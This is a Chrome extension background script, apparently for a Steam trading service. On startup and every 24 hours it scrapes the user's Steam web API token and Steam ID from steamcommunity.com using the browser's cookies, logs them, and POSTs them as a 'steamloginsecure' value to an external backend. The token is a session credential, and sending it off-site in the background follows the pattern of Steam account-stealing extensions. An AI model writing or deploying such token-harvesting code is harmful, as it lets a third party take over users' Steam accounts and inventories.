import { environment } from "./environment";

async function fetchSteamToken() {
  try {
    const resp = await fetch("https://steamcommunity.com", {
      credentials: "include",
      headers: {
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9;q=0.8,application/signed-exchange;v=b3;q=0.7",
      },
    });

    const body = await resp.text();
    const match = /data-loyalty_webapi_token="&quot;([a-zA-Z0-9_.-]+)&quot;"/.exec(body);

    if (!match || match.length < 2) {
      throw new Error("Failed to parse web API token.");
    }

    const token = match[1];

    const steamIDMatch = /g_steamID = "(\d+?)"/.exec(body);
    if (!steamIDMatch || steamIDMatch.length === 0) {
      return null;
    }

    console.log(token, "token");

    const req = {
      steamloginsecure: `${steamIDMatch[1] + "||" + token}`,
      steamid: steamIDMatch[1],
    };

    console.log(req, "req");

    const res = await fetch(`${environment.zipit_base_api_url_live}/add_steamloginsecure`, {
      credentials: "include",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(req),
    });

    const resBody = await res.json(); // Assuming the backend returns JSON data
    console.log(resBody, "Backend response");

    if (resp.status !== 200) {
      throw new Error("invalid status");
    }

    const req1 = {
      extension_status: 1,
      steamid: steamIDMatch[1], // Use the retrieved Steam ID
    };

    const res1 = await fetch(`${environment.zipit_base_api_url}/extension_status`, {
      credentials: "include",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(req1),
    });

    const resBody2 = await res1.json();
    console.log(resBody2, "Backend response");
    // Store the token in Chrome storage
    // chrome.storage.local.set({ steamToken: token }, () => {
    //   console.log("Steam API token saved.");
    // });

    chrome.storage.local.set({ [`steamToken`]: { token: token, steamID: steamIDMatch[1] } }, () => {
      console.log(`Steam API token and ID for ${steamIDMatch[1]} saved.`);
    });
  } catch (error) {
    console.error("Error fetching Steam token:", error);
  }
}

// Run the function when the extension starts
fetchSteamToken();

// chrome.runtime.onMessage.addListener((message, _sender, sendResponse) => {
//   if (message.action === "extensionInstalled") {
//     console.log("Extension installed message received.");
//     // Perform necessary actions on install
//     sendResponse({ status: "received" });
//   }
// });

// Create an alarm to fetch the token every 24 hours (86400 seconds)
// Event listener for extension install (onInstalled)
chrome.runtime.onInstalled.addListener(async () => {
  // chrome.runtime.sendMessage({ action: "extensionInstalled" }, (response) => {
  //   console.log("Response from listener:", response);
  // });
  chrome.alarms.create("fetchSteamTokenAlarm", {
    periodInMinutes: 1440, // 24 hours
  });
  // try {
  //   // Get the stored Steam Token and Steam ID
  //   chrome.storage.local.get([`steamToken`], async (result) => {
  //     let data = result[`steamToken`];
  //     data = data ? JSON.parse(data) : null;

  //     if (data) {
  //       console.log("Token:", data.token);
  //       console.log("Steam ID:", data.steamID);
  //       const id = data.steamID; // Assign the Steam ID here

  //       // Send the request to update extension status using the Steam ID
  //       const req = {
  //         extension_status: 1,
  //         steamid: id, // Use the retrieved Steam ID
  //       };

  //       const res = await fetch(`${environment.zipit_base_api_url}/extension_status`, {
  //         credentials: "include",
  //         method: "POST",
  //         headers: {
  //           "Content-Type": "application/json",
  //         },
  //         body: JSON.stringify(req),
  //       });

  //       const resBody = await res.json();
  //       console.log(resBody, "Backend response");

  //       // Create an alarm to fetch the token every 24 hours (1440 minutes)
  //       chrome.alarms.create("fetchSteamTokenAlarm", {
  //         periodInMinutes: 1440, // 24 hours
  //       });
  //     } else {
  //       console.log("Token and Steam ID not found for the specified ID.");
  //     }
  //   });
  // } catch (error) {
  //   console.error("Error in extension installation:", error);
  // }
});

// When the extension is suspended
chrome.runtime.onSuspend.addListener(async () => {
  try {
    const req = {
      extension_status: 0,
      steamid: "76561199584532931",
    };

    const res = await fetch(`${environment.zipit_base_api_url}/extension_status`, {
      credentials: "include",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(req),
    });

    const resBody = await res.json();
    console.log(resBody, "Backend response");

    chrome.runtime.sendMessage({ action: "extensionSuspended" });
  } catch (error) {
    console.error("Error during extension suspension:", error);
  }
});

// When the extension is uninstalled
// chrome.management.onUninstalled.addListener(async () => {
//   try {
//     alert("Extension uninstalled");
//     // Get the stored Steam Token and Steam ID
//     chrome.storage.local.get(["steamToken"], async (result) => {
//       let data = result["steamToken"];
//       data = data ? JSON.parse(data) : null;

//       if (data) {
//         console.log("Token:", data.token);
//         console.log("Steam ID:", data.steamID);
//         const id = data.steamID; // Assign the Steam ID here

//         // Send the request to update extension status using the Steam ID
//         const req = {
//           extension_status: 0, // Assuming 0 indicates uninstalled state
//           steamid: id, // Use the retrieved Steam ID
//         };

//         try {
//           const res = await fetch(`${environment.zipit_base_api_url_live}/extension_status`, {
//             credentials: "include",
//             method: "POST",
//             headers: {
//               "Content-Type": "application/json",
//             },
//             body: JSON.stringify(req),
//           });

//           const resBody = await res.json();
//           console.log(resBody, "Backend response for uninstallation");
//         } catch (error) {
//           console.error("Error during API request:", error);
//         }
//       } else {
//         console.log("Token and Steam ID not found for the specified ID.");
//       }
//     });

//     // Handle any additional cleanup if needed
//   } catch (error) {
//     console.error("Error during extension uninstallation:", error);
//   }
// });

// Listen for the alarm and fetch the token
chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "fetchSteamTokenAlarm") {
    fetchSteamToken();
  }
});
